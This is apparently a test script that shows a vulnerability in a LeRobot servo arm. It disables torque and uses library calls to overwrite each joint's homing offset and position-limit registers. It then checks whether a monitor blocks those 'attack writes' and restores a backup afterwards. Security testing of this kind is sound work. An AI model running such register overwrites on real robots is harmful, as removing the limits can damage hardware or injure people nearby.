"""Phase 1 vulnerability demo: a host process opens the servo limits with LeRobot's own calls.
Read registers -> bus.reset_calibration() -> read again -> restore -> verify. Commands no motion,
but torque is turned OFF and stays off: support the arm first. Follower only, 12 V on.

  .venv/bin/python tests/vuln_limits.py /dev/serial/by-id/<follower>
  .venv/bin/python tests/vuln_limits.py <port> --separate --label monitor            # 18 writes, one by one
  .venv/bin/python tests/vuln_limits.py <port> --restore results/<run>/backup.json   # recovery

reset_calibration() stops at the first refused write (Homing_Offset), so behind the monitor it never
sends the limit writes. --separate sends offset, min and max to every joint independently instead.

Each run saves backup.json (written before anything changes) and result.json in results/<time>/."""
import argparse, json, sys, time
from dataclasses import asdict
from datetime import datetime
from pathlib import Path

CAL_FILE = Path.home() / ".cache/huggingface/lerobot/calibration/robots/so_follower/my_follower.json"
NAMES = ["shoulder_pan", "shoulder_lift", "elbow_flex", "wrist_flex", "wrist_roll", "gripper"]
FIELDS = (("Homing_Offset", "homing_offset"), ("Min_Position_Limit", "range_min"),
          ("Max_Position_Limit", "range_max"))


def make_bus(port):
    from lerobot.motors import Motor, MotorNormMode, SerialMotorsBus
    return SerialMotorsBus(port, {n: Motor(i, "sts3215", MotorNormMode.RANGE_M100_100)
                                  for i, n in enumerate(NAMES, 1)})


def snapshot(bus):
    for attempt in range(5):
        try:
            return {m: {k: v for k, v in asdict(c).items() if k != "drive_mode"}
                    for m, c in bus.read_calibration().items()}
        except ConnectionError:
            if attempt == 4:
                raise
            time.sleep(0.1)


def restore(bus, want):
    """Rewrite only registers that differ, retry, verify. Returns the list still wrong."""
    for _ in range(3):
        try:
            now = snapshot(bus)
            todo = [(m, reg, k) for m in NAMES for reg, k in FIELDS if now[m][k] != want[m][k]]
            if not todo:
                return []
            bus.disable_torque(num_retry=5)         # also opens the EEPROM lock
        except (ConnectionError, RuntimeError) as e:
            print("  restore:", e)
            time.sleep(0.2)
            continue
        for m, reg, k in todo:
            try:
                bus.write(reg, m, want[m][k], normalize=False, num_retry=3)
            except (ConnectionError, RuntimeError) as e:
                print("  restore:", e)
        time.sleep(0.1)
    now = snapshot(bus)
    return [f"{m}.{k}: is {now[m][k]}, want {want[m][k]}" for m in NAMES for _, k in FIELDS
            if now[m][k] != want[m][k]]


ATTACK = {"homing_offset": (0, 1), "range_min": (0, 1), "range_max": (4095, 4094)}  # second if already first


def separate_writes(bus, before, rows):
    """Try every attack write on its own, then read that register back. Appends to rows as it goes."""
    for m in NAMES:
        for reg, k in FIELDS:
            old = before[m][k]
            val = next(v for v in ATTACK[k] if v != old)        # always a real change
            err = None
            try:
                bus.write(reg, m, val, normalize=False)         # no retry: one attempt, one outcome
            except (ConnectionError, RuntimeError) as e:
                err = str(e)
            now = int(bus.read(reg, m, normalize=False, num_retry=5))
            outcome = ("changed" if now == val else "unchanged" if now == old else "other") + \
                      ("/no-reply" if err else "/ack")
            rows.append({"joint": m, "register": reg, "before": old, "attempted": val, "after": now,
                         "outcome": outcome, "error": err})
            print(f"{m:14} {reg:20} {old:>5} -> tried {val:<5} now {now:<5} {outcome}")


def table(before, after):
    print(f"\n{'joint':14} {'min before->after':>20} {'max before->after':>20} {'offset before->after':>22}")
    for m in NAMES:
        b, a = before[m], after[m]
        print(f"{m:14} " + " ".join(f"{b[k]:>{w}} -> {a[k]:<5}" for k, w in
                                    (("range_min", 11), ("range_max", 11), ("homing_offset", 13))))


def check_file(snap, path):
    cal = json.loads(Path(path).read_text())
    return [f"{m}.{k}: servo {snap[m][k]}, file {cal[m][k]}" for m in NAMES for _, k in FIELDS
            if snap[m][k] != cal[m][k]]


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("port")
    ap.add_argument("--restore", metavar="BACKUP", help="only restore registers from a backup.json")
    ap.add_argument("--cal-file", default=CAL_FILE, help="follower calibration to compare against first")
    ap.add_argument("--label", default="", help="note saved in result.json, e.g. direct / passthrough / monitor")
    ap.add_argument("--separate", action="store_true", help="try all 18 attack writes one by one")
    ap.add_argument("--out", default="results")
    a = ap.parse_args()

    bus = make_bus(a.port)
    bus.connect()
    try:
        if a.restore:
            input("Torque will go OFF. Support the arm, then press Enter (Ctrl-C to quit). ")
            left = restore(bus, json.loads(Path(a.restore).read_text()))
            print("RESTORED" if not left else "NOT RESTORED:\n  " + "\n  ".join(left))
            return bool(left)

        before = snapshot(bus)
        diff = check_file(before, a.cal_file)
        if diff:                                    # wrong arm, or already reset: do not touch it
            print("Servo registers do not match the follower calibration file; nothing changed:\n  "
                  + "\n  ".join(diff))
            return 1
        out = Path(a.out) / (datetime.now().strftime("%Y%m%d-%H%M%S") + ("-separate" if a.separate else ""))
        out.mkdir(parents=True)
        (out / "backup.json").write_text(json.dumps(before, indent=1))
        print("Backup:", out / "backup.json")
        input("Torque will go OFF. Support the arm, then press Enter (Ctrl-C to quit). ")

        after, errors, left, rows = None, {}, ["restore did not run"], []
        try:
            bus.disable_torque(num_retry=5)
            if a.separate:
                separate_writes(bus, before, rows)
            for m in NAMES if not a.separate else ():   # per motor so one refusal doesn't hide the rest
                try:
                    bus.reset_calibration(m)
                except (ConnectionError, RuntimeError) as e:
                    errors[m] = str(e)
            after = snapshot(bus)
        finally:
            left = restore(bus, before)
            print("\nrestore:", "verified, all registers match the backup" if not left
                  else "FAILED, rerun with --restore " + str(out / "backup.json") + "\n  " + "\n  ".join(left))
            changed = after and [m for m in NAMES if any(before[m][k] != after[m][k]
                                                         for k in ("range_min", "range_max"))]
            (out / "result.json").write_text(json.dumps(
                {"time": datetime.now().isoformat(), "label": a.label, "port": a.port, "before": before,
                 "after": after, "errors": errors, "limits_changed": changed, "restore_left": left,
                 **({"mode": "separate", "writes": rows} if a.separate else {})}, indent=1))
        table(before, after)
        print(f"\nLimits changed on {len(changed)} joints: {', '.join(changed) or 'none'}")
        if a.separate:
            final = {(m, reg): after[m][k] for m in NAMES for reg, k in FIELDS}
            hit = sum(final[r["joint"], r["register"]] != r["before"] for r in rows)
            blocked = sum(r["outcome"] == "unchanged/no-reply" and final[r["joint"], r["register"]] == r["before"]
                          for r in rows)
            print(f"{len(rows)} writes tried: {hit} registers changed, {blocked} blocked (no reply, unchanged)")
        for m, e in errors.items():
            print(f"  {m}: write failed: {e}")
        print("Saved", out / "result.json")
        return bool(left)
    finally:
        bus.disconnect()


if __name__ == "__main__":
    sys.exit(main())
